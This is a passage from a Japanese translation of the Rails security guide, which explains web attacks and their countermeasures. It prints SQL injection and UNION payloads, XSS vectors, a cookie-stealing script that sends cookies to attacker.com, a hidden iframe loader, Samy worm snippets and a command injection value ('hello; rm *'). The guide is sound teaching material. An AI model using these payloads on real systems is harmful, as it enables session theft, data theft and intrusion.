ウェブアプリケーションによっては、ユーザーアカウントをハイジャックするためのさまざまな方法があります。多くの場合、CSRFとXSSがその手助けをします。たとえば、[Googleメール](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/)のCSRFの脆弱性のようにです。この攻撃の概念実証では、被害者は攻撃者が制御するウェブサイトに誘導されます。そのサイトには、Googleメールのフィルタ設定を変更するHTTP GETリクエストを行うクラフトされたIMGタグがあります。被害者がGoogleメールにログインしている場合、攻撃者はフィルタをすべてのメールを自分のメールアドレスに転送するように変更します。これはアカウント全体をハイジャックするのとほぼ同じくらい有害です。対策としては、「アプリケーションのロジックを見直し、すべてのXSSとCSRFの脆弱性を排除する」ことです。

### CAPTCHA

情報: _CAPTCHAは、応答がコンピュータによって生成されていないことを確認するためのチャレンジ-レスポンステストです。これは、登録フォームを攻撃者から保護し、ユーザーに歪んだ画像の文字を入力させることで、自動スパムボットからのコメントフォームを保護するためによく使用されます。これがポジティブCAPTCHAですが、ネガティブCAPTCHAもあります。ネガティブCAPTCHAのアイデアは、ユーザーが人間であることを証明するのではなく、ロボットがロボットであることを明らかにすることです。_

人気のあるポジティブCAPTCHA APIは、[reCAPTCHA](https://developers.google.com/recaptcha/)で、古い本の単語の歪んだ画像を2つ表示します。これは、以前のCAPTCHAが破られたため、背景の歪みやテキストの高い歪みの代わりに、傾斜した線を追加しています。さらに、reCAPTCHAの使用は古い本のデジタル化にも役立ちます。[ReCAPTCHA](https://github.com/ambethia/recaptcha/)は、同じ名前のAPIとしてのRailsプラグインでもあります。

APIから公開キーと秘密キーの2つのキーを取得し、それらをRailsの環境に設定する必要があります。その後、ビューでrecaptcha_tagsメソッド、コントローラでverify_recaptchaメソッドを使用できます。verify_recaptchaは、検証に失敗した場合にfalseを返します。
CAPTCHAの問題は、ユーザーエクスペリエンスに悪影響を与えることです。さらに、一部の視覚障害を持つユーザーは、特定の種類の歪んだCAPTCHAを読みにくいと感じることがあります。それにもかかわらず、ポジティブCAPTCHAは、あらゆる種類のボットからのフォームの送信を防ぐための最良の方法の1つです。

ほとんどのボットは非常に単純です。彼らはウェブをクロールし、見つけたすべてのフォームのフィールドにスパムを入れます。ネガティブCAPTCHAはそれを利用し、フォームに「ハニーポット」フィールドを含めます。このフィールドは、CSSやJavaScriptによって人間のユーザーから隠されます。

ネガティブCAPTCHAは、単純なボットに対してのみ効果的であり、ターゲットされたボットからの攻撃を防ぐためには十分ではありません。それにもかかわらず、ネガティブCAPTCHAとポジティブCAPTCHAを組み合わせることで、パフォーマンスを向上させることができます。たとえば、「ハニーポット」フィールドが空でない場合（ボットが検出された場合）、レスポンスを計算する前にGoogle ReCaptchaへのHTTPSリクエストを行う必要がなくなります。

以下は、JavaScriptと/またはCSSを使用してハニーポットフィールドを隠すいくつかのアイデアです：

- ページの表示領域外にフィールドを配置する
- 要素を非常に小さくするか、ページの背景と同じ色にする
- フィールドを表示したままにして、人間に対して空白のままにするように伝える
最もシンプルなネガティブCAPTCHAは、隠しハニーポットフィールドを1つ含んでいます。サーバーサイドでは、フィールドの値をチェックします。テキストが含まれている場合、それはボットであるはずです。その場合、投稿を無視するか、肯定的な結果を返すことができますが、データベースには保存しません。これにより、ボットは満足して次に進むでしょう。

Ned Batchelderの[ブログ記事](https://nedbatchelder.com/text/stopbots.html)で、より洗練されたネガティブCAPTCHAの例を見つけることができます。

* 現在のUTCタイムスタンプを含むフィールドを追加し、サーバーでチェックします。過去の時間または未来の時間である場合、フォームは無効です。
* フィールド名をランダム化します。
* 提出ボタンを含む複数のハニーポットフィールドを追加します。

ただし、これによって自動ボットから保護されるだけであり、特定の目的に特化したボットはこれでは止めることができません。したがって、ネガティブCAPTCHAはログインフォームを保護するためには適していないかもしれません。

### ロギング

警告: _Railsにパスワードをログファイルに記録しないように指示してください。_

デフォルトでは、RailsはWebアプリケーションへのすべてのリクエストをログに記録します。しかし、ログファイルはログイン資格情報やクレジットカード番号などを含むセキュリティ上の大きな問題となり得ます。Webアプリケーションのセキュリティコンセプトを設計する際には、Webサーバーへの（完全な）アクセスが攻撃者によって取得された場合に何が起こるかも考える必要があります。データベース内の秘密やパスワードを暗号化しても、ログファイルがそれらを平文でリストアップしている場合はほとんど無意味です。ログファイルから特定のリクエストパラメータをフィルタリングするには、アプリケーションの設定で[`config.filter_parameters`][]に追加することができます。これにより、ログ内のこれらのパラメータは[FILTERED]とマークされます。

```ruby
config.filter_parameters << :password
```

提供されたパラメータは部分一致の正規表現によってフィルタリングされます。Railsは、`password`、`secret`、`token`などの典型的なアプリケーションパラメータを処理するために、適切なイニシャライザ（`initializers/filter_parameter_logging.rb`）にデフォルトのフィルタリストを追加します。

### 正規表現

情報: _Rubyの正規表現でよくある落とし穴は、文字列の先頭と末尾を^と$でマッチングさせようとすることです。代わりに\Aと\zを使用する必要があります。_

Rubyは、文字列の終わりと始まりをマッチングさせるために、他の多くの言語とはやや異なるアプローチを採用しています。そのため、多くのRubyやRailsの書籍でもこれを間違えることがあります。では、なぜこれがセキュリティ上の脅威となるのでしょうか？たとえば、URLフィールドを緩くバリデーションしたい場合、次のような単純な正規表現を使用したとします。

```ruby
  /^https?:\/\/[^\n]+$/i
```

これは一部の言語ではうまく機能するかもしれません。しかし、Rubyでは`^`と`$`は**行**の先頭と行末にマッチします。そのため、次のようなURLも問題なくフィルタを通過します。

```
javascript:exploit_code();/*
http://hi.com
*/
```

このURLはフィルタを通過します。正規表現は2行目にマッチングし、残りの部分は関係ありません。さて、URLを次のように表示するビューがあると想像してみてください。

```ruby
  link_to "ホームページ", @user.homepage
```

このリンクは訪問者には無害に見えますが、クリックするとJavaScriptの関数「exploit_code」または攻撃者が提供する他のJavaScriptが実行されます。

正規表現を修正するには、`^`と`$`の代わりに`\A`と`\z`を使用する必要があります。

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

これはよくある間違いなので、フォーマットバリデータ（validates_format_of）は、提供された正規表現が`^`で始まるか`$`で終わる場合には例外を発生させるようになっています。`^`と`$`の代わりに\Aと\zを使用する必要がない場合（まれですが）、:multilineオプションをtrueに設定することができます。

```ruby
  # コンテンツには文字列のどこかに "Meanwhile" という行が含まれている必要があります
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

これにより、フォーマットバリデータを使用する際の最も一般的なミスに対して保護されますが、常にRubyでは`^`と`$`が**行**の先頭と行末にマッチングすることを念頭に置いておく必要があることを覚えておいてください。

### 特権エスカレーション

警告: _単一のパラメータを変更するだけで、ユーザーは許可されていないアクセスを行うことができます。隠蔽や曖昧化をどれだけ行っても、すべてのパラメータは変更可能であることを忘れないでください。_

ユーザーが改ざんする可能性のある最も一般的なパラメータは、idパラメータです。例えば、`http://www.domain.com/project/1`のような形式で、1がidです。このidはコントローラのparamsで利用できます。そこで、おそらく次のような処理を行うでしょう。
```ruby
@project = Project.find(params[:id])
```

これは一部のWebアプリケーションでは問題ありませんが、ユーザーがすべてのプロジェクトを表示する権限を持っていない場合は適していません。ユーザーがidを42に変更し、その情報を表示する権限がない場合でも、それにアクセスできてしまいます。その代わりに、_ユーザーのアクセス権もクエリに含めてください_：

```ruby
@project = @current_user.projects.find(params[:id])
```

Webアプリケーションによっては、ユーザーが操作できるパラメータがさらに多く存在する場合があります。一般的なルールとして、_ユーザーの入力データは安全ではないという前提で取り扱い、ユーザーからのすべてのパラメータは潜在的に操作される可能性がある_と考えてください。

セキュリティを覆い隠すためのJavaScriptセキュリティに惑わされないでください。開発者ツールを使用すると、すべてのフォームの非表示フィールドを確認および変更できます。_JavaScriptはユーザーの入力データを検証するために使用できますが、攻撃者が予期しない値で悪意のあるリクエストを送信することを防ぐためには使用できません_。Mozilla FirefoxのFirebugアドオンはすべてのリクエストをログに記録し、繰り返し変更することができます。これはJavaScriptの検証をバイパスする簡単な方法です。さらに、インターネットのリクエストとレスポンスを傍受することができるクライアントサイドのプロキシも存在します。

インジェクション
---------

INFO: _インジェクションは、悪意のあるコードやパラメータをWebアプリケーションに導入し、そのセキュリティコンテキスト内で実行する攻撃の一種です。インジェクションの代表的な例として、クロスサイトスクリプティング（XSS）やSQLインジェクションがあります。_

インジェクションは非常に厄介です。同じコードやパラメータでも、一つのコンテキストでは悪意を持つものであり、別のコンテキストでは完全に無害なものになることがあります。コンテキストにはスクリプト言語、クエリ言語、プログラミング言語、シェル、Ruby/Railsのメソッドなどがあります。以下のセクションでは、インジェクション攻撃が発生する可能性のあるすべての重要なコンテキストについて説明します。ただし、最初のセクションでは、インジェクションに関連するアーキテクチャ上の決定について説明します。

### 許可リストと制限リスト

NOTE: _何かをサニタイズ、保護、または検証する場合、制限リストではなく許可リストを使用することをお勧めします。_

制限リストは、悪意のあるメールアドレス、非公開のアクション、または悪意のあるHTMLタグのリストです。これに対して、許可リストは、良いメールアドレス、公開アクション、良いHTMLタグなどのリストです。許可リストを作成することができない場合もありますが（スパムフィルターなど）、_許可リストのアプローチを使用することをお勧めします_：

* セキュリティに関連するアクションに対しては、`before_action except: [...]`を使用してください。これにより、新しく追加されたアクションに対してセキュリティチェックを有効にするのを忘れることがありません。
* クロスサイトスクリプティング（XSS）に対して、`<script>`を削除する代わりに`<strong>`を許可してください。詳細については以下を参照してください。
* 制限リストを使用してユーザーの入力データを修正しようとしないでください：
    * これは攻撃を成功させます：`"<sc<script>ript>".gsub("<script>", "")`
    * ただし、不正な入力は拒否してください

許可リストは、制限リストに何かを忘れるという人的要因に対しても有効なアプローチです。

### SQLインジェクション

INFO: _巧妙な方法のおかげで、ほとんどのRailsアプリケーションではほとんど問題になりません。ただし、これはWebアプリケーションで非常に壊滅的で一般的な攻撃ですので、問題を理解することが重要です。_

#### 導入

SQLインジェクション攻撃は、Webアプリケーションのパラメータを操作することでデータベースクエリに影響を与えることを目的としています。SQLインジェクション攻撃の一般的な目標は、認証をバイパスすることです。別の目標は、データの操作や任意のデータの読み取りです。以下は、クエリでユーザーの入力データを使用しない方法の例です：

```ruby
Project.where("name = '#{params[:name]}'")
```

これは検索アクションであり、ユーザーは検索したいプロジェクトの名前を入力することができます。悪意のあるユーザーが`' OR 1) --`と入力した場合、生成されるSQLクエリは次のようになります：

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

ハイフン2つはコメントを開始し、それ以降のすべてを無視します。したがって、クエリはユーザーには見えないレコードを含むプロジェクトテーブルのすべてのレコードを返します。これは、条件がすべてのレコードに対して真であるためです。

#### 認証のバイパス

通常、Webアプリケーションにはアクセス制御が含まれています。ユーザーはログイン資格情報を入力し、Webアプリケーションはユーザーテーブルで一致するレコードを見つけようとします。アプリケーションはレコードを見つけた場合にアクセスを許可します。しかし、攻撃者はSQLインジェクションを使用してこのチェックをバイパスする可能性があります。以下は、ユーザーが提供したログイン資格情報パラメータに一致するユーザーテーブルの最初のレコードを見つけるためのRailsでの典型的なデータベースクエリの例です。
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

もし攻撃者が名前に `' OR '1'='1` を、パスワードに `' OR '2'>'1` を入力した場合、生成されるSQLクエリは以下のようになります：

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

これにより、データベース内の最初のレコードが単純に見つかり、このユーザーにアクセスが許可されます。

#### 不正な読み取り

UNIONステートメントは2つのSQLクエリを接続し、データを1つのセットで返します。攻撃者はこれを使用してデータベースから任意のデータを読み取ることができます。上記の例を見てみましょう：

```ruby
Project.where("name = '#{params[:name]}'")
```

そして、UNIONステートメントを使用して別のクエリを注入してみましょう：

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

これにより、以下のSQLクエリが生成されます：

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

結果はプロジェクトのリストではなく、ユーザー名とそのパスワードのリストになります。ですので、データベース内のパスワードを[安全にハッシュ化](#user-management)していることを願っています！攻撃者にとって唯一の問題は、両方のクエリの列数が同じである必要があることです。そのため、2番目のクエリには常に1の値である1のリストが含まれており、最初のクエリの列数と一致するようにしています。

また、2番目のクエリではASステートメントを使用していくつかの列の名前を変更しています。これにより、Webアプリケーションはユーザーテーブルの値を表示します。Railsを少なくとも2.1.1にアップデートしてください。

#### 対策

Ruby on Railsには、特殊なSQL文字をエスケープする組み込みのフィルターがあります。これにより、`'`、`"`、NULL文字、および改行がエスケープされます。*`Model.find(id)`や`Model.find_by_something(something)`を使用すると、自動的にこの対策が適用されます*。ただし、SQLフラグメント、特に*条件フラグメント（`where("...")`）や`connection.execute()`や`Model.find_by_sql()`メソッドでは、手動で適用する必要があります*。

文字列を渡す代わりに、次のようにして汚染された文字列をサニタイズするために位置指定ハンドラを使用できます：

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

最初のパラメータは、クエリ内の疑問符を含むSQLフラグメントです。2番目と3番目のパラメータは、疑問符を変数の値で置き換えます。

名前付きハンドラも使用できます。値は使用されるハッシュから取得されます：

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

さらに、使用ケースに適した条件を分割してチェーンすることもできます：

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

前述の対策はモデルインスタンスでのみ利用可能です。他の場所では[`sanitize_sql`]を試してみることができます。_外部の文字列をSQLに使用する際には、セキュリティ上の影響を考える習慣を身につけましょう_。


### クロスサイトスクリプティング（XSS）

INFO: _Webアプリケーションにおける最も広まっているセキュリティ脆弱性の1つであり、最も破壊的なものの1つがXSSです。この悪意のある攻撃はクライアントサイドで実行可能なコードを注入します。Railsはこれらの攻撃を防ぐためのヘルパーメソッドを提供しています。_

#### エントリーポイント

エントリーポイントとは、攻撃者が攻撃を開始できる脆弱なURLとそのパラメータのことです。

最も一般的なエントリーポイントは、メッセージ投稿、ユーザーコメント、ゲストブックですが、プロジェクトのタイトル、ドキュメント名、検索結果ページなど、ユーザーがデータを入力できる場所ならどこでも脆弱性が存在します。ただし、入力はウェブサイトの入力ボックスからのみではなく、明示的なもの、隠れたもの、内部のものである必要はありません。ユーザーはトラフィックを傍受できる可能性があります。アプリケーションやクライアントサイドのプロキシを使用すると、リクエストを変更することが容易になります。また、バナー広告などの他の攻撃ベクトルもあります。

XSS攻撃は次のように機能します：攻撃者がいくつかのコードを注入し、ウェブアプリケーションがそれを保存してページに表示し、後で被害者に提示します。ほとんどのXSSの例では、単純にアラートボックスが表示されますが、それ以上の機能があります。XSSはクッキーを盗み、セッションを乗っ取り、被害者を偽のウェブサイトにリダイレクトし、攻撃者の利益のために広告を表示し、機密情報を取得するためにウェブサイトの要素を変更したり、ウェブブラウザのセキュリティホールを介して悪意のあるソフトウェアをインストールすることができます。

2007年後半、Mozillaブラウザで88の脆弱性が報告され、Safariで22、IEで18、Operaで12が報告されました。Symantec Global Internet Security threat reportによれば、2007年下半期には239のブラウザプラグインの脆弱性が文書化されています。[Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/)は非常に活発で最新の攻撃フレームワークであり、これらの脆弱性を悪用します。犯罪的なハッカーにとって、ウェブアプリケーションフレームワークのSQLインジェクションの脆弱性を悪用し、テキストのテーブル列に悪意のあるコードを挿入することは非常に魅力的です。2008年4月、51万以上のサイトがこのようにハッキングされました。その中にはイギリス政府、国連などの高プロファイルなターゲットも含まれています。
#### HTML/JavaScriptのインジェクション

最も一般的なXSS言語は、もちろん最も人気のあるクライアントサイドスクリプト言語であるJavaScriptです。HTMLと組み合わせて使用されることが多いです。ユーザーの入力をエスケープすることは重要です。

以下はXSSをチェックするための最も簡単なテストです。

```html
<script>alert('Hello');</script>
```

このJavaScriptコードは単純にアラートボックスを表示します。次の例は、非常に一般的でない場所で同じことを行います。

```html
<img src="javascript:alert('Hello')">
<table background="javascript:alert('Hello')">
```

##### クッキーの盗難

これまでの例では何の害もありませんでしたので、次に攻撃者がユーザーのクッキー（およびユーザーのセッションを乗っ取る）方法を見てみましょう。JavaScriptでは、`document.cookie`プロパティを使用してドキュメントのクッキーを読み取りおよび書き込みすることができます。JavaScriptは同一生成元ポリシーを強制するため、1つのドメインのスクリプトは他のドメインのクッキーにアクセスすることはできません。`document.cookie`プロパティは、元のWebサーバーのクッキーを保持します。ただし、このプロパティを直接HTMLドキュメントに埋め込む（XSSで行われるように）場合には、このプロパティを読み取りおよび書き込みすることができます。自分のウェブアプリケーションのどこにでもこれを埋め込んで、結果ページで自分のクッキーを表示してみてください。

```html
<script>document.write(document.cookie);</script>
```

攻撃者にとっては、これは役に立ちません。なぜなら、被害者は自分自身のクッキーを見ることになるからです。次の例では、URL http://www.attacker.com/ にクッキーを追加して画像を読み込もうとします。もちろん、このURLは存在しないため、ブラウザは何も表示しません。しかし、攻撃者は自分のウェブサーバーのアクセスログファイルを確認して被害者のクッキーを見ることができます。

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

www.attacker.comのログファイルは次のようになります。

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

これらの攻撃を緩和するためには、クッキーに**httpOnly**フラグを追加することが重要です。これにより、`document.cookie`はJavaScriptから読み取ることができなくなります。HTTP Onlyクッキーは、IE v6.SP1、Firefox v2.0.0.5、Opera 9.5、Safari 4、およびChrome 1.0.154以降で使用することができます。ただし、WebTVやMac上のIE 5.5などの他の古いブラウザでは、ページの読み込みに失敗する可能性があります。ただし、Ajaxを使用すると、クッキーは[まだ表示されます](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly)。

##### 改ざん

ウェブページの改ざんでは、攻撃者はさまざまなことができます。たとえば、誤った情報を提示したり、被害者を攻撃者のウェブサイトに誘導してクッキーやログイン資格情報、その他の機密データを盗むことができます。最も一般的な方法は、iframeを使用して外部ソースからコードを含めることです。

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

これは外部ソースから任意のHTMLおよび/またはJavaScriptを読み込み、サイトの一部として埋め込みます。この`iframe`は、[Mpack攻撃フレームワーク](https://isc.sans.edu/diary/MPack+Analysis/3015)を使用して、実際のイタリアの正規サイトへの攻撃で使用されました。Mpackは、ウェブブラウザのセキュリティホールを介して悪意のあるソフトウェアをインストールしようとします。この攻撃は非常に成功しており、攻撃の50%が成功しています。

より専門的な攻撃では、ウェブサイト全体を重ね合わせたり、サイトのオリジナルと同じように見えるログインフォームを表示したりして、ユーザー名とパスワードを攻撃者のサイトに送信することができます。または、CSSと/またはJavaScriptを使用して、ウェブアプリケーション内の正規のリンクを非表示にし、その場所に偽のウェブサイトにリダイレクトする別のリンクを表示することもできます。

反射型のインジェクション攻撃は、ペイロードが後で被害者に表示されるのではなく、URLに含まれる攻撃です。特に検索フォームでは、検索文字列をエスケープすることに失敗することがあります。次のリンクは、「ジョージ・ブッシュが9歳の少年を議長に任命した」というページを表示しました。

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### 対策

_悪意のある入力をフィルタリングすることは非常に重要ですが、ウェブアプリケーションの出力をエスケープすることも重要です_。

特にXSSの場合、制限された入力フィルタリングではなく、許可された入力フィルタリングを行うことが重要です。制限されたリストフィルタリングは、許可されていない値ではなく、許可された値を指定します。制限されたリストは完全ではありません。

制限されたリストでは、ユーザーの入力から「script」を削除します。しかし、攻撃者は「<scrscriptipt>」をインジェクションし、フィルタリング後に「<script>」が残ります。以前のバージョンのRailsでは、`strip_tags()`、`strip_links()`、および`sanitize()`メソッドに制限されたリストアプローチが使用されていました。そのため、次のようなインジェクションが可能でした。

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

これは`"some<script>alert('hello')</script>"`を返し、攻撃が成功します。そのため、許可されたリストアプローチを使用する方が良いです。更新されたRails 2の`sanitize()`メソッドを使用します。
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

これにより、指定されたタグのみが許可され、あらゆる種類のトリックや不正なタグに対してもうまく処理されます。

第二のステップとして、特にユーザーの入力を再表示する場合には、アプリケーションのすべての出力をエスケープすることが良いプラクティスです。これは、入力されていないフィルタリングされたユーザーの入力（前述の検索フォームの例のようなもの）を再表示する場合に特に重要です。HTMLの入力文字`&`、`"`、`<`、および`>`を、HTML内でのそのままの表現（`&amp;`、`&quot;`、`&lt;`、および`&gt;`）に置き換えるために、`html_escape()`（またはその別名である`h()`）メソッドを使用してください。

##### 難読化とエンコーディングのインジェクション

ネットワークトラフィックは主に限られた西洋のアルファベットに基づいているため、他の言語の文字を伝送するためにUnicodeなどの新しい文字エンコーディングが登場しました。しかし、これはWebアプリケーションにとっても脅威となります。なぜなら、悪意のあるコードがWebブラウザで処理できるかもしれないが、Webアプリケーションでは処理できない異なるエンコーディングで隠される可能性があるからです。以下はUTF-8エンコーディングでの攻撃ベクトルの例です。

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

この例では、メッセージボックスが表示されます。ただし、上記の`sanitize()`フィルターによって認識されます。文字列を難読化およびエンコードするための優れたツールは、[Hackvertor](https://hackvertor.co.uk/public)です。Railsの`sanitize()`メソッドは、エンコーディング攻撃から保護するためにうまく機能します。

#### アンダーグラウンドからの例

_Webアプリケーションへの攻撃を理解するためには、実際の攻撃ベクトルをいくつか見てみるのが最善です。_

以下は、[Js.Yamanner@m Yahoo! Mail worm](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa)の抜粋です。これは2006年6月11日に登場し、最初のWebメールインターフェースワームでした。

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

このワームは、通常はタグからすべてのtarget属性とonload属性をフィルタリングするYahooのHTML/JavaScriptフィルターの穴を突いています（JavaScriptが含まれるため）。ただし、フィルターは一度だけ適用されるため、ワームコードを含むonload属性はそのまま残ります。これは、制限されたリストフィルターが完全ではなく、WebアプリケーションでHTML/JavaScriptを許可するのが難しい理由の良い例です。

もう1つの概念実証のWebメールワームはNdujaで、4つのイタリアのWebメールサービス向けのクロスドメインワームです。[Rosario Valottaの論文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/)で詳細を確認できます。両方のWebメールワームは、メールアドレスを収集することを目的としており、これは犯罪的なハッカーがお金を稼ぐことができるものです。

2006年12月、[MySpaceのフィッシング攻撃](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html)で実際のユーザー名とパスワードが3万4000件盗まれました。攻撃のアイデアは、「login_home_index_html」という名前のプロファイルページを作成し、URLが非常に説得力を持つようにすることでした。特別に作成されたHTMLとCSSを使用して、本物のMySpaceコンテンツをページから非表示にし、独自のログインフォームを表示しました。

### CSSインジェクション

INFO: _CSSインジェクションは実際にはJavaScriptインジェクションです。なぜなら、一部のブラウザ（IE、一部のバージョンのSafariなど）がCSS内でJavaScriptを許可しているからです。WebアプリケーションでカスタムCSSを許可するかどうかはよく考えてください。_

CSSインジェクションは、よく知られた[MySpace Samy worm](https://samy.pl/myspace/tech.html)によって最もよく説明されています。このワームは、Samy（攻撃者）のプロフィールを訪れるだけで自動的にSamyに友達リクエストを送信しました。数時間で100万以上の友達リクエストがあり、それによってMySpaceがオフラインになりました。以下は、そのワームの技術的な説明です。

MySpaceは多くのタグをブロックしていますが、CSSは許可されています。そのため、ワームの作者は次のようにCSS内にJavaScriptを配置しました。

```html
<div style="background:url('javascript:alert(1)')">
```

したがって、ペイロードはstyle属性にあります。ただし、ペイロードには引用符を使用できません。なぜなら、すでにシングルクォートとダブルクォートが使用されているからです。しかし、JavaScriptには、任意の文字列をコードとして実行する便利な`eval()`関数があります。

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

`eval()`関数は、制限されたリストの入力フィルターにとっては悪夢です。なぜなら、style属性が「innerHTML」という単語を隠すことができるからです。

```js
alert(eval('document.body.inne' + 'rHTML'));
```

次の問題は、MySpaceが「"javascript"」という単語をフィルタリングしていることでした。そのため、作者はこれを回避するために「"java<NEWLINE>script"」を使用しました。

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

ワームの作者にとっての別の問題は、[CSRFセキュリティトークン](#cross-site-request-forgery-csrf)でした。これがないと、POST経由で友達リクエストを送信することができませんでした。作者は、ユーザーを追加する直前にページにGETを送信し、結果からCSRFトークンを解析することでこれを回避しました。
最終的に、彼は4 KBのワームを取得し、それを自分のプロフィールページに注入しました。

[moz-binding](https://securiteam.com/securitynews/5LP051FHPE) CSSプロパティは、Geckoベースのブラウザ（たとえばFirefox）でJavaScriptをCSSに導入する別の方法であることがわかりました。

#### 対策

この例でも、制限されたリストフィルタは完全ではありませんでした。ただし、WebアプリケーションでのカスタムCSSは非常にまれな機能であるため、適切な許可されたCSSフィルタを見つけるのは難しいかもしれません。_カスタムの色や画像を許可したい場合は、ユーザーに選択させてWebアプリケーション内でCSSを構築することができます_。本当に必要な場合は、Railsの`sanitize()`メソッドを許可されたCSSフィルタのモデルとして使用してください。

### テキスタイルインジェクション

セキュリティ上の理由から、HTML以外のテキスト書式設定を提供したい場合は、サーバーサイドでHTMLに変換されるマークアップ言語を使用してください。[RedCloth](http://redcloth.org/)はRubyのためのそのような言語ですが、注意を払わないとXSSの脆弱性があります。

たとえば、RedClothは`_test_`を`<em>test<em>`に変換し、テキストを斜体にします。ただし、現在のバージョン3.0.4まで、XSSの脆弱性が残っています。重大なバグが修正された[新しいバージョン4](http://www.redcloth.org)を入手してください。ただし、そのバージョンにも[いくつかのセキュリティバグ](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)がありますので、対策は引き続き適用されます。以下はバージョン3.0.4の例です：

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

`:filter_html`オプションを使用して、Textileプロセッサによって作成されなかったHTMLを削除します。

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

ただし、これによってすべてのHTMLがフィルタリングされるわけではありません。いくつかのタグが残ります（設計上の理由で）、たとえば`<a>`：

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### 対策

XSSに対する対策のセクションで説明されているように、_RedClothを許可された入力フィルタと組み合わせて使用することをお勧めします_。

### Ajaxインジェクション

注意：_Ajaxアクションに対しても通常のアクションと同じセキュリティ対策を講じる必要があります。ただし、1つ例外があります。アクションがビューをレンダリングしない場合、出力はコントローラで既にエスケープする必要があります。_

[in_place_editorプラグイン](https://rubygems.org/gems/in_place_editing)を使用するか、ビューをレンダリングせずに文字列を返すアクションを使用する場合、_アクションで返される値をエスケープする必要があります_。そうしないと、返された値にXSSの文字列が含まれている場合、悪意のあるコードがブラウザに戻されて実行されます。`h()`メソッドを使用して入力値をエスケープしてください。

### コマンドラインインジェクション

注意：_ユーザーが提供したコマンドラインパラメータを慎重に使用してください。_

アプリケーションが基になるオペレーティングシステムでコマンドを実行する必要がある場合、Rubyにはいくつかのメソッドがあります：`system(command)`、`exec(command)`、`spawn(command)`、`` `command` ``。ユーザーがコマンド全体または一部を入力できる場合、これらの関数には特に注意が必要です。これはほとんどのシェルで、セミコロン（`;`）や縦棒（`|`）を使用して最初のコマンドの末尾に別のコマンドを実行できるためです。

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# "hello"を表示し、カレントディレクトリのファイルを削除します
```

対策として、_`system(command, parameters)`メソッドを使用してコマンドラインパラメータを安全に渡す_ことが推奨されます。

```ruby
system("/bin/echo", "hello; rm *")
# "hello; rm *"を表示し、ファイルを削除しません
```

#### Kernel#openの脆弱性

`Kernel#open`は、引数が縦棒（`|`）で始まる場合にOSコマンドを実行します。

```ruby
open('| ls') { |file| file.read }
# `ls`コマンドを経由してファイルリストをStringで返します
```

対策として、代わりに`File.open`、`IO.open`、または`URI#open`を使用します。これらはOSコマンドを実行しません。

```ruby
File.open('| ls') { |file| file.read }
# `ls`コマンドを実行せず、存在する場合は`| ls`ファイルを開きます

IO.open(0) { |file| file.read }
# stdinを開きます。引数としてStringを受け付けません

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# URIを開きます。`URI()`は`| ls`を受け付けません
```

### ヘッダーインジェクション

警告：_HTTPヘッダーは動的に生成され、特定の状況下ではユーザーの入力が注入される可能性があります。これにより、誤ったリダイレクト、XSS、またはHTTPレスポンスの分割が発生する可能性があります。_

HTTPリクエストヘッダーには、Referer、User-Agent（クライアントソフトウェア）、Cookieフィールドなどがあります。たとえば、レスポンスヘッダーにはステータスコード、Cookie、Location（リダイレクト先URL）フィールドがあります。これらすべてはユーザーが提供するものであり、より多かれ少なかれ努力を払って操作することができます。_これらのヘッダーフィールドもエスケープすることを忘れないでください。_ たとえば、管理エリアでユーザーエージェントを表示する場合。
それ以外にも、ユーザーの入力に基づいてレスポンスヘッダーを一部構築する際に何をしているかを知ることは重要です。例えば、特定のページにユーザーをリダイレクトしたい場合、指定されたアドレスにリダイレクトするためにフォームに「referer」フィールドを導入しました。

```ruby
redirect_to params[:referer]
```

